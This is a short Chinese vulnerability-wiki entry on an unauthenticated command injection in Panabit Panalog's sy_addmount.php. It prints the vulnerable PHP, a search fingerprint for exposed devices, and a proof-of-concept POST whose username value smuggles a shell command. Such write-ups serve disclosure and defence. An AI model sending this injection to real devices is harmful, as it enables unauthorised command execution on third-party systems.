---
title: "Panabit Panalog sy_addmount.php 远程命令执行漏洞"
date: 2026-10-18 09:15:09
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "Panabit-Panalog"
tags:
  - "Panabit-Panalog"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

Panabit Panalog sy_addmount.php过滤不足，导致远程命令执行漏洞

## 漏洞影响

```
Panabit Panalog
```

## 网络测绘

```
body="Maintain/cloud_index.php"
```

## 漏洞复现

登录页面

![image-20230314084818630](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314084818630.png)

存在漏洞的代码为 account/sy_addmount.php

```
<?php

include(dirname(__FILE__)."/../common.php");

$username = isset($_REQUEST["username"]) ? $_REQUEST["username"] : "";
if (empty($username)) {
	echo '{"success":"no", "out":"NO_USER"}';
	exit;
}

$username = addslashes($username);

$rows = array();

$cmd = PANALOGEYE." behavior add account=$username";
exec($cmd, $out, $ret);
echo $out[0];
exit;
```

其中没有对身份进行鉴权，且 username 可控，构造POC

```
POST /account/sy_addmount.php

username=|id
```

![image-20230314084851344](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314084851344.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/Panabit-Panalog-sy_addmount.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
